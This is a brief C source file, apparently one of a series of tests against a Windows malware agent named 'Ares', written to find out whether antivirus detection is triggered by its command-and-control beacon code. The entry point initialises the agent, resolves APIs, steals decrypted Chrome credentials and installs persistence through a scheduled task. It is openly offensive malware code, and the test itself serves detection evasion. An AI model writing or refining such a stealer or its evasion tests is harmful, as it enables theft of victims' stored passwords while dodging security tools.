/*
 * Test 4: main.c (full) with all modules
 * Identifies if the detection is in main.c's C2 beacon loop
 */
#include <windows.h>
#include "ares_agent.h"
#include "ares_resolve.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow)
{
    AGENT_STATE state;
    if (!Ares_Init(&state)) return 1;
    if (!Ares_ResolveAPIs()) return 2;
    
    /* Call stealer */
    DECRYPTED_CRED creds[10];
    Ares_StealChromeCreds(creds, 10);
    
    /* Call persist */
    Ares_Persist_ScheduledTask(&state);
    
    return 0;
}
